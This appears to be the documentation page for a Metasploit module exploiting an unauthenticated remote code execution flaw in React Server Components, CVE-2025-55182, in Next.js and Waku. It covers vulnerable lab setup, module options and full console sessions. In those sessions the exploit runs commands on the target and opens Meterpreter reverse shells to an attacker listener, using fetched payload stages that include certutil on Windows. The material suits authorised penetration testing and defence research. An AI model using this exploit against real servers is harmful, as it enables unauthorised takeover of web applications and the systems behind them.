## Vulnerable Application

A critical unauthenticated Remote Code Execution (RCE) vulnerability exists in React Server
Components (RSC) Flight protocol. The vulnerability allows attackers to achieve prototype
pollution during deserialization of RSC payloads by sending specially crafted multipart
requests with "__proto__", "constructor", or "prototype" as module names.

This module supports multiple vulnerable frameworks including **Next.js** and **Waku**.

## Verification Steps

1. Start `msfconsole`
2. `use multi/http/react2shell_unauth_rce_cve_2025_55182`
3. `set RHOSTS <target_ip>`
4. `set RPORT <target_port>`
5. `set TARGET <target_id>` (0 for Next.js - Unix Command, 1 for Next.js - Windows Command,
   2 for Waku - Unix Command, 3 for Waku - Windows Command)
6. `set PAYLOAD <payload>`
7. `run`

## Options

This module does not require any additional options beyond the standard HTTP client options.

## Testing

### Next.js - Linux

1. Open `data\exploits\react2shell_unauth_rce_cve_2025_55182` directory
2. Build
```
docker build -t react2shell .
```
3. Run
```
docker run -p 3000:3000 react2shell
```
4. Open http://127.0.0.1:3000/ and make sure the app is available

### Next.js - Windows

1. Download and install Node.js https://nodejs.org/en/download
2. Open `data\exploits\react2shell_unauth_rce_cve_2025_55182` directory
3. Build the application
```
npm run build
```
4. Start the application
```
npm start
```
5. Open http://127.0.0.1:3000/ and make sure the app is available

### Waku - Linux

**Dockerfile:**

```dockerfile
FROM node:20-slim

# Install dependencies
RUN apt-get update && apt-get install -y expect socat netcat-traditional bash wget curl && rm -rf /var/lib/apt/lists/*

WORKDIR /tmp

# Create Waku project non-interactively
RUN npx --yes create-waku@0.12.4-0.26.0-alpha.2-0 --project-name waku-project

# Move project to /app
RUN mv waku-project /app

WORKDIR /app

EXPOSE 3001
```

**docker-compose.yml:**

```yaml
services:
  waku:
    build: .
    container_name: waku-vuln
    ports:
      - "3001:3001"
    environment:
      - NODE_ENV=development
    command: sh -c "npm run dev & sleep 5 && exec socat TCP-LISTEN:3001,fork,reuseaddr TCP:[::1]:3000"
```

**Setup:**

1. Build and start the lab:
```
docker compose up -d --build
```
3. Wait for the container to initialize (Waku dev server starts on port 3000, proxied via socat to port 3001)
4. Verify the service is running:
```
curl http://127.0.0.1:3001
```

## Scenarios

### Next.js - Linux

**Example 1: Simple Command Execution**

```
msf6 > use multi/http/react2shell_unauth_rce_cve_2025_55182
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3011
RPORT => 3011
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set TARGET 0
TARGET => 0
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set PAYLOAD cmd/unix/generic
PAYLOAD => cmd/unix/generic
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set CMD "touch /tmp/nextjs_test.txt"
CMD => touch /tmp/nextjs_test.txt
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Exploit completed, but no session was created.
```

Verify execution:
```
docker exec react-rsc-vulnerable ls -la /tmp/nextjs_test.txt
-rw-r--r--    1 nextjs   nogroup          0 Dec 17 20:37 /tmp/nextjs_test.txt
```

**Example 2: Meterpreter Reverse Shell**

```
msf > use multi/http/react2shell_unauth_rce_cve_2025_55182
[*] No payload configured, defaulting to cmd/linux/http/aarch64/meterpreter/reverse_tcp
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3011
RPORT => 3011
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set TARGET 0
TARGET => 0
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set FETCH_SRVPORT 9000
FETCH_SRVPORT => 9000
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (3090404 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:35140) at 2025-12-17 22:09:40 +0100

meterpreter > sysinfo 
Computer     : 172.17.0.2
OS           : Debian 12.12 (Linux 6.14.0-116036-tuxedo)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```


### Waku - Linux

**Example 1: Simple Command Execution**

```
msf > use multi/http/react2shell_unauth_rce_cve_2025_55182
[*] No payload configured, defaulting to cmd/linux/http/aarch64/meterpreter/reverse_tcp
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3001
RPORT => 3001
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set TARGET 2
TARGET => 2
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set PAYLOAD cmd/unix/generic
PAYLOAD => cmd/unix/generic
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set CMD "touch /tmp/waku_exploit_test.txt"
CMD => touch /tmp/waku_exploit_test.txt
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set ForceExploit true
ForceExploit => true
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Cannot reliably check exploitability. Waku blind RCE - cannot reliably check without command execution ForceExploit is enabled, proceeding with exploitation.

[*] Exploit completed, but no session was created.
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > 
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > docker exec waku-vuln ls -la /tmp/waku_exploit_test.txt
[*] exec: docker exec waku-vuln ls -la /tmp/waku_exploit_test.txt

-rw-r--r-- 1 root root 0 Dec 17 20:35 /tmp/waku_exploit_test.txt
```

**Example 2: Meterpreter Reverse Shell**

```
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > use multi/http/react2shell_unauth_rce_cve_2025_55182
[*] Using configured payload cmd/unix/generic
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3001
RPORT => 3001
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set TARGET 2
TARGET => 2
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LHOST 172.18.0.1
LHOST => 172.18.0.1
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set FETCH_SRVPORT 9000
FETCH_SRVPORT => 9000
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set ForceExploit true
ForceExploit => true
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 172.18.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Cannot reliably check exploitability. Waku blind RCE - cannot reliably check without command execution ForceExploit is enabled, proceeding with exploitation.
[*] Sending stage (3090404 bytes) to 172.18.0.2
[*] Meterpreter session 1 opened (172.18.0.1:4444 -> 172.18.0.2:56806) at 2025-12-17 21:36:15 +0100

meterpreter > sysinfo 
Computer     : 172.18.0.2
OS           : Debian 12.12 (Linux 6.14.0-116036-tuxedo)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

### Next.js - Windows

```
msf6 > use multi/http/react2shell_unauth_rce_cve_2025_55182
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 192.168.19.137
RHOSTS => 192.168.19.137
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LPORT 6666
LPORT => 6666
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set target 1
target => 1
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp
payload => cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set FETCH_SRVPORT 8082
FETCH_SRVPORT => 8082
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set FETCH_COMMAND CERTUTIL
FETCH_COMMAND => CERTUTIL
msf6 exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run

[*] Started reverse TCP handler on 192.168.19.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (203846 bytes) to 192.168.19.137
[*] Meterpreter session 7 opened (192.168.19.130:4444 -> 192.168.19.137:49835) at 2025-12-05 03:00:47 -0500

meterpreter > getuid
Server username: DESKTOP-ABCDEF\vognik
meterpreter > sysinfo
Computer        : DESKTOP-ABCDEF
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter >
```
